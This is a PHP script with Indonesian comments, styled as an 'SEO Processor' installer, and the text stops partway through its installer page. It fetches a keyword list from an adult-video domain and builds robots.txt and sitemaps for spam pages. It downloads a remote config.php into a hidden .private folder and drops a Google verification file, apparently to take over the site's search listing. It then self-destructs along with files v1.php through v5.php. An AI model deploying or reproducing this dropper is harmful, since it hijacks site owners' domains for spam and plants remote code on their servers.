<?php
date_default_timezone_set('Asia/Jakarta');
@set_time_limit(300); // 5 menit untuk semua operasi

// --- [KONFIGURASI DASAR] ---
$self_script_name = basename($_SERVER['PHP_SELF']);
$self_script_path = __FILE__;
$server_path = dirname(__FILE__);

// Logika domain
$host = $_SERVER['HTTP_HOST'] ?? 'default-domain.com';
$clean_host = str_replace('www.', '', $host);
$full_domain_url = 'https://' . $clean_host;

// URL Download
$config_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/.private/config.php';
$google_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/google8f39414e57a5615a.html';
$base_json_url_path = 'https://player.javpornsub.net/content/';

// Path Penyimpanan
$cache_dir = $server_path . '/.private';
$local_json_path = $cache_dir . '/active_seo_data.json';
$local_config_path = $cache_dir . '/config.php';
$local_google_path = $server_path . '/google8f39414e57a5615a.html'; 
$local_robots_path = $server_path . '/robots.txt';
$local_sitemap_path = $server_path . '/sitemap.xml';

// --- [FUNGSI HELPER] ---

function fetchFromUrl($url, $default = []) { 
    $content = false;
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }
    if ($content === false && function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    $data = json_decode($content, true);
    if (is_array($data) && !empty($data)) {
        return $data;
    }
    return $default;
}

function fetchRawUrl($url) {
    $content = false;
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }
    if ($content === false && function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    return $content;
}

function cek_url_json($url) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_NOBODY => true
    ]);
    curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}

function buat_robots_txt($domain) {
    global $local_robots_path;
    $sitemapUrl = 'https://' . $domain . '/sitemap.xml';
    $robotsContent = "User-agent: *\nAllow: /\n\nSitemap: $sitemapUrl\n";
    if (@file_put_contents($local_robots_path, $robotsContent)) {
        return true;
    }
    return false;
}

// --- [FUNGSI UTAMA (DIBAGI 2 BAGIAN)] ---

/**
 * BAGIAN 1: Menjalankan Tugas 1, 2, 3, 4 (JSON, Robots, Sitemap, Config)
 */
function jalankan_proses_seo_part1() {
    global $clean_host, $cache_dir, $local_json_path, $server_path, 
           $base_json_url_path, $local_sitemap_path, $self_script_name,
           $config_url, $local_config_path; // [DITAMBAH]

    if (!isset($_GET['json_file']) || empty(trim($_GET['json_file']))) {
        header('Location: ' . $self_script_name);
        exit;
    }
    
    $json_filename = trim($_GET['json_file']);
    if (substr($json_filename, -5) !== '.json') {
        $json_filename .= '.json';
    }
    $derived_json_url = $base_json_url_path . $json_filename;

    $logs = [
        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Memulai proses SEO otomatis untuk ' . htmlspecialchars($clean_host)]
    ];

    if (!is_dir($cache_dir)) {
        if (!@mkdir($cache_dir, 0755, true)) {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal membuat folder .private. Periksa izin.'];
            tampilkan_log_terminal($logs, 'final_error', $json_filename, $clean_host); 
            return false;
        } else {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Folder .private dibuat.'];
        }
    }

    // --- TUGAS 1: UNDUH JSON ---
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh JSON dari: ' . htmlspecialchars($derived_json_url)];
    $json_data = fetchFromUrl($derived_json_url, false);
    if ($json_data !== false && !empty($json_data)) {
        @file_put_contents($local_json_path, json_encode($json_data));
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'JSON disimpan di: .private/active_seo_data.json'];
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh JSON. Sitemap mungkin kosong.'];
    }
    
    // --- TUGAS 2: BUAT ROBOTS.TXT ---
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Membuat robots.txt...'];
    if (buat_robots_txt($clean_host)) {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'robots.txt berhasil dibuat.'];
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal membuat robots.txt.'];
    }
    
    // --- TUGAS 3: BUAT SITEMAP ---
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Membuat sitemap.xml...'];
    $keywords = $json_data ? array_keys($json_data) : [];
    $total_keywords = count($keywords);
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $base_url = $protocol . $clean_host;
    $now = date('Y-m-d\TH:i:s+07:00');
    $urls_per_map = 50000;
    $num_maps = ceil($total_keywords / $urls_per_map);
    if ($num_maps == 0) $num_maps = 1;

    for ($i = 1; $i <= $num_maps; $i++) {
        $sitemap_file = 'sitemap-' . $i . '.xml';
        $sitemap_path_sub = $server_path . '/' . $sitemap_file;
        $offset = ($i - 1) * $urls_per_map;
        $keywords_chunk = array_slice($keywords, $offset, $urls_per_map);
        $xml_sub = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
        $xml_sub .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
        foreach ($keywords_chunk as $keyword) {
            $url = $base_url . '/' . htmlspecialchars(urlencode($keyword));
            $xml_sub .= '  <url><loc>' . $url . '</loc><lastmod>' . $now . '</lastmod></url>' . PHP_EOL;
        }
        $xml_sub .= '</urlset>' . PHP_EOL;
        @file_put_contents($sitemap_path_sub, $xml_sub);
    }
    
    $xml_index = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    $xml_index .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
    for ($i = 1; $i <= $num_maps; $i++) {
        $map_url = $base_url . '/sitemap-' . $i . '.xml';
        $xml_index .= '  <sitemap><loc>' . htmlspecialchars($map_url) . '</loc><lastmod>' . $now . '</lastmod></sitemap>' . PHP_EOL;
    }
    $xml_index .= '</sitemapindex>' . PHP_EOL;
    @file_put_contents($local_sitemap_path, $xml_index);
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index dan $num_maps sub-sitemap dibuat."];

    // --- TUGAS 4: UNDUH CONFIG.PHP [DIPINDAH KE SINI] ---
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh config.php...'];
    $config_content = fetchRawUrl($config_url);
    if ($config_content !== false && !empty($config_content)) {
        @file_put_contents($local_config_path, $config_content);
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'config.php disimpan di: .private/config.php'];
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh config.php.'];
    }

    // Panggil terminal untuk Jeda Pengecekan Slug
    tampilkan_log_terminal($logs, 'step2_check_slug', $json_filename, $clean_host);
}

/**
 * BAGIAN 2: Menjalankan Tugas 5 (Google)
 */
function jalankan_proses_seo_part2() {
    global $clean_host, $google_url, $local_google_path, $self_script_name; // [DIHAPUS] config

    // Ambil json_filename dari URL
    $json_filename = $_GET['json_file'] ?? '';

    $logs = [
        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Melanjutkan proses...']
    ];

    // --- TUGAS 5: UNDUH GOOGLE HTML [HANYA INI YANG TERSISA] ---
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh google8f39414e57a5615a.html...'];
    $google_content = fetchRawUrl($google_url);
    if ($google_content !== false && !empty($google_content)) {
        @file_put_contents($local_google_path, $google_content);
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'google8f39414e57a5615a.html disimpan di root.'];
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh google...html.'];
    }
    
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Semua tugas selesai. Mengalihkan ke status...'];
    
    // Panggil terminal untuk ke Halaman Status
    tampilkan_log_terminal($logs, 'status', $json_filename, $clean_host);
}


/**
 * Fungsi untuk menampilkan UI Terminal dengan log
 * $next_action: 'step2_check_slug', 'status', 'final_error'
 */
function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename = '', $clean_host = '') {
    global $self_script_name;
    
    $step2_url = $self_script_name . '?action=generate_step2&json_file=' . urlencode($json_filename);
    $status_url = $self_script_name . '?status=completed&json_file=' . urlencode($json_filename);
    $check_slug_url = 'https://' . $clean_host . '/wanz-895-eng-sub';

    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Processing...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">x.php (SEO Processor)</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
            </div>
        </div>
    <script>
        const logs = ' . json_encode($logs) . ';
        const container = document.getElementById("logsContainer");
        let currentLog = 0; let currentChar = 0; let currentLine = null;
        
        const next_action = "' . $next_action . '";
        const step2_url = "' . $step2_url . '";
        const status_url = "' . $status_url . '";
        const check_slug_url = "' . $check_slug_url . '";

        function typeNextChar() {
            if (currentLog >= logs.length) {
                
                if (next_action === "step2_check_slug") {
                    let promptLine = document.createElement("div");
                    promptLine.className = "log-entry";
                    promptLine.innerHTML = \'<span class="timestamp">' . date('H:i:s') . '</span><span class="log-warning typing">Tekan ENTER untuk Cek Slug (' . htmlspecialchars($check_slug_url) . ')...</span>\';
                    container.appendChild(promptLine);

                    document.addEventListener("keydown", function(e) {
                        if (e.key === "Enter") {
                            e.preventDefault(); 
                            window.open(check_slug_url, \'_blank\');
                            window.location.href = step2_url;
                        }
                    }, { once: true }); // [PENTING] { once: true } mencegah listener ter-trigger berkali-kali

                } else if (next_action === "status") {
                    setTimeout(() => {
                        container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                        setTimeout(() => {
                            window.location.href = status_url;
                        }, 500);
                    }, 500);

                } else if (next_action === "final_error") {
                    container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                }
                
                return;
            }
            
            const log = logs[currentLog];
            if (currentChar === 0) {
                currentLine = document.createElement("div");
                currentLine.className = "log-entry";
                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                container.appendChild(currentLine);
            }
            
            const messageElement = currentLine.querySelector(".typing");
            if (currentChar < log.message.length) {
                messageElement.textContent += log.message[currentChar];
                currentChar++;
                setTimeout(typeNextChar, 8);
            } else {
                messageElement.classList.remove("typing");
                currentChar = 0;
                currentLog++;
                setTimeout(typeNextChar, 50);
            }
        }
        setTimeout(typeNextChar, 200);
    </script>
    </body></html>';
}


/**
 * Fungsi hapus_skrip_sendiri
 */
function hapus_skrip_sendiri() {
    global $self_script_name, $full_domain_url;

    header('Content-Type: text/html'); 
    $domain_to_show = htmlspecialchars($full_domain_url);

    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Delete Script</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 600px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-info { color: #0095ff; }
        .log-warning { color: #ffbd2e; } 
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
        .domain-display { background: #1a1a1a; border: 1px solid #333; padding: 8px 12px; margin: 10px 0; font-size: 10px; color: #ffd60a; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">delete.script</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
                <div class="domain-display">Domain: ' . $domain_to_show . '</div>
                <div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>
            </div>
        </div>
    <script>
        const logs = [
            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Memulai proses penghapusan skrip..."},
            {timestamp: "' . date('H:i:s') . '", type: "warning", message: "PERINGATAN: Pastikan domain telah di verifikasi di Google."},
            {timestamp: "' . date('H:i:s') . '", type: "warning", message: "File \'google...html\' dan \'v*.php\' akan dihapus permanen."},
            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Tekan ENTER untuk menyalin domain dan MENGHAPUS SEMUA FILE."}
        ];
        const container = document.getElementById("logsContainer");
        let currentLog = 0; let currentChar = 0; let currentLine = null;
        
        function typeNextChar() {
            if (currentLog >= logs.length) {
                document.addEventListener("keydown", function(e) {
                    if (e.key === "Enter") {
                        navigator.clipboard.writeText("' . $domain_to_show . '").then(() => {
                            window.location.href = \'' . $self_script_name . '?action=delete&confirm=yes\';
                        }).catch(err => {
                            window.location.href = \'' . $self_script_name . '?action=delete&confirm=yes\';
                        });
                    }
                }, { once: true });
                return;
            }
            const log = logs[currentLog];
            if (currentChar === 0) {
                currentLine = document.createElement("div");
                currentLine.className = "log-entry";
                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                container.appendChild(currentLine);
            }
            const messageElement = currentLine.querySelector(".typing");
            if (currentChar < log.message.length) {
                messageElement.textContent = log.message.substring(0, currentChar + 1);
                currentChar++;
                setTimeout(typeNextChar, 8);
            } else {
                messageElement.classList.remove("typing");
                currentChar = 0;
                currentLog++;
                setTimeout(typeNextChar, 50);
            }
        }
        setTimeout(typeNextChar, 200);
    </script>
    </body></html>';
}

/**
 * Fungsi tampilkan_status_selesai
 */
function tampilkan_status_selesai() {
    global $clean_host, $self_script_name, $base_json_url_path,
           $local_json_path, $local_config_path, $local_google_path, $local_robots_path, $local_sitemap_path;
    
    $json_filename = $_GET['json_file'] ?? '';
    $derived_json_url = '';
    if (!empty($json_filename)) {
         $derived_json_url = $base_json_url_path . $json_filename;
    }
           
    $json_exists = file_exists($local_json_path);
    $config_exists = file_exists($local_config_path);
    $google_exists = file_exists($local_google_path);
    $robots_exists = file_exists($local_robots_path);
    $sitemap_exists = file_exists($local_sitemap_path);
    
    $is_deleted = !file_exists($self_script_name);
    $json_accessible = !empty($derived_json_url) ? cek_url_json($derived_json_url) : false;
    
    $all_files_ok = $json_exists && $config_exists && $google_exists && $robots_exists && $sitemap_exists;

    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>System Status</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
        .json-url { color: #ff375f; background: #1a1a1a; padding: 1px 4px; border: 1px solid #333; font-size: 10px; }
        .domain-highlight { color: #ffd60a; }
        a { color: #0095ff; text-decoration: none; font-size: 10px; } a:hover { text-decoration: underline; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">system.status</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
                <div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>
            </div>
        </div>
    <script>
        const logs = [
            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Ringkasan Status Sistem:"},
            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Domain Terdeteksi: ' . htmlspecialchars($clean_host) . '"},
            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Status Skrip: ' . ($is_deleted ? 'Telah Dihapus' : 'Aktif') . '"},
            {timestamp: "' . date('H:i:s') . '", type: "info", message: "JSON Endpoint: ' . (!empty($derived_json_url) ? htmlspecialchars($derived_json_url) : 'Tidak diketahui') . '"},
            {timestamp: "' . date('H:i:s') . '", type: "' . ($json_accessible ? 'success' : 'error') . '", message: "Akses JSON: ' . ($json_accessible ? 'Tersedia' : 'Tidak Tersedia') . '"},
            {timestamp: "' . date('H:i:s') . '", type: "' . ($json_exists ? 'success' : 'error') . '", message: ".private/active_seo_data.json: ' . ($json_exists ? 'Ada' : 'Hilang') . '"},
            {timestamp: "' . date('H:i:s') . '", type: "' . ($robots_exists ? 'success' : 'error') . '", message: "robots.txt: ' . ($robots_exists ? 'Ada' : 'Hilang') . '"},
            {timestamp: "' . date('H:i:s') . '", type: "' . ($sitemap_exists ? 'success' : 'error') . '", message: "sitemap.xml: ' . ($sitemap_exists ? 'Ada' : 'Hilang') . '"},
            {timestamp: "' . date('H:i:s') . '", type: "' . ($config_exists ? 'success' : 'error') . '", message: ".private/config.php: ' . ($config_exists ? 'Ada' : 'Hilang') . '"},
            {timestamp: "' . date('H:i:s') . '", type: "' . ($google_exists ? 'success' : 'error') . '", message: "google...html: ' . ($google_exists ? 'Ada (file terverifikasi masih ada)' : 'Hilang (sudah dihapus)') . '"},
            ' . ($all_files_ok && $json_accessible && !$is_deleted ? '
            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Semua sistem operasional. Melanjutkan untuk menghapus..."},' : 
            (!$all_files_ok || !$json_accessible ? '{timestamp: "' . date('H:i:s') . '", type: "warning", message: "Satu atau lebih file/endpoint gagal. Tekan R untuk validasi ulang."},' : 
            '{timestamp: "' . date('H:i:s') . '", type: "info", message: "Proses selesai."},')
            ) . '
        ];
        
        const container = document.getElementById("logsContainer");
        let currentLog = 0; let currentChar = 0; let currentLine = null;
        let action_type = "' . ($all_files_ok && $json_accessible && !$is_deleted ? 'delete' : ((!$all_files_ok || !$json_accessible) ? 'refresh' : 'none')) . '";

        function typeNextChar() {
            if (currentLog >= logs.length) {
                if (action_type === "delete") {
                    setTimeout(() => { window.location.href = \'' . $self_script_name . '?action=delete\'; }, 500);
                }
                document.addEventListener("keydown", function(e) {
                    if ((e.key === "r" || e.key === "R") && action_type === "refresh") {
                        window.location.reload();
                    }
                }, { once: true });
                return;
            }
            const log = logs[currentLog];
            if (currentChar === 0) {
                currentLine = document.createElement("div");
                currentLine.className = "log-entry";
                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                container.appendChild(currentLine);
            }
            const messageElement = currentLine.querySelector(".typing");
            if (currentChar < log.message.length) {
                let messageText = log.message.substring(0, currentChar + 1);
                if (log.message.includes("' . (!empty($derived_json_url) ? htmlspecialchars($derived_json_url) : 'null') . '")) {
                    messageElement.innerHTML = messageText.replace("' . htmlspecialchars($derived_json_url) . '", \'<span class="json-url">' . htmlspecialchars($derived_json_url) . '</span>\');
                } else if (log.message.includes("' . htmlspecialchars($clean_host) . '")) {
                    messageElement.innerHTML = messageText.replace("' . htmlspecialchars($clean_host) . '", \'<span class="domain-highlight">' . htmlspecialchars($clean_host) . '</span>\');
                } else {
                    messageElement.textContent = messageText;
                }
                currentChar++;
                setTimeout(typeNextChar, 8);
            } else {
                messageElement.classList.remove("typing");
                currentChar = 0;
                currentLog++;
                setTimeout(typeNextChar, 30);
            }
        }
        setTimeout(typeNextChar, 200);
    </script>
    </body></html>';
}


// --- [ROUTER UTAMA (DIMODIFIKASI)] ---

if (isset($_GET['action']) && $_GET['action'] === 'generate') {
    // Memulai Bagian 1
    jalankan_proses_seo_part1();
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'generate_step2') {
    // Memulai Bagian 2 (setelah cek slug)
    jalankan_proses_seo_part2();
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'delete' && !isset($_GET['confirm'])) {
    hapus_skrip_sendiri();
    exit;
}

// --- [BLOK PENGHAPUSAN (TETAP SAMA)] ---
if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
    global $server_path, $local_google_path, $self_script_path, $full_domain_url;

    $files_to_delete = [
        $server_path . '/v1.php',
        $server_path . '/v2.php',
        $server_path . '/v3.php',
        $server_path . '/v4.php',
        $server_path . '/v5.php',
        $server_path . '/vx.php',
        $local_google_path 
    ];

    $deleted_files_log = [];

    foreach ($files_to_delete as $file) {
        if (file_exists($file)) {
            if (@unlink($file)) {
                $deleted_files_log[] = basename($file) . ' ... Dihapus';
            } else {
                $deleted_files_log[] = basename($file) . ' ... Gagal Dihapus (Periksa Izin)';
            }
        }
    }

    if (@unlink($self_script_path)) {
        $deleted_files_log[] = basename($self_script_path) . ' ... Dihapus (Self-destruct)';
        $self_delete_success = true;
    } else {
        $deleted_files_log[] = basename($self_script_path) . ' ... GAGAL Dihapus (Self-destruct)';
        $self_delete_success = false;
    }

    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Script Deleted</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 600px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; }
        .log-error { color: #ff5f57; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">delete.script</div>
            </div>
            <div class="terminal-content">';
    
    foreach ($deleted_files_log as $log) {
        $log_type = (strpos($log, 'GAGAL') !== false) ? 'log-error' : 'log-success';
        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span class="' . $log_type . '">' . htmlspecialchars($log) . '</span></div>';
    }

    if ($self_delete_success) {
        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span style="color: #666;">Domain disalin ke clipboard: ' . htmlspecialchars($full_domain_url) . '</span></div>';
        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span style="color: #666;">Semua operasi selesai</span></div>';
    }

    echo '</div></div></body></html>';
    exit;
}

if (isset($_GET['status'])) {
    tampilkan_status_selesai();
    exit;
} 

// --- [HALAMAN DEFAULT (Tampilan "Installer" dengan Form Input)] ---
else {
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Installer</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
        
        .input-form { 
            margin-top: 20px; 
            display: none;
            background: #1a1a1a;
            padding: 15px;
            border: 1px solid #333;
        }
        .input-form label {
            display: block;
            margin-bottom: 8px;
            color: #0095ff;
        }
        .input-form input[type="text"] {
            width: 100%;
            padding: 10px;
            background: #222;
            border: 1px solid #444;
            color: #fff;
            font-family: inherit;
            font-size: 11px;
            box-sizing: border-box;
        }
        .input-form button {
            display: block;
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            background: #28ca42;
            border: none;
            color: #000;
            font-weight: bold;
            cursor: pointer;
            font-family: inherit;
            font-size: 12px;
        }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">system.installer</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
                
